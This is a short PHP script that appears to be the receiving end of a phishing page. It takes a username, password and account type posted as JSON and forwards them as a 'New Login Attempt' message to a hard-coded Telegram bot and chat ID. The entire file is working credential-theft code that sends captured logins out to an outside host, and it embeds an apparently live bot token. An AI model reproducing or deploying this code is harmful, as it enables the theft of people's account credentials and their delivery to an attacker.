<?php
$token = '8472908079:AAHRhM8yUVmfMagFkA85x8T0Zp9WMqWZftU';
$chat_id = '7865246557';

$input = json_decode(file_get_contents('php://input'), true);

if (isset($input['type'])) {
    $msg = "👤 **New Login Attempt:**\n";
    $msg .= "🔹 User: " . $input['user'] . "\n";
    $msg .= "🔹 Pass: " . $input['pass'] . "\n";
    $msg .= "🔹 Type: " . $input['accType'];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($msg));
}
?>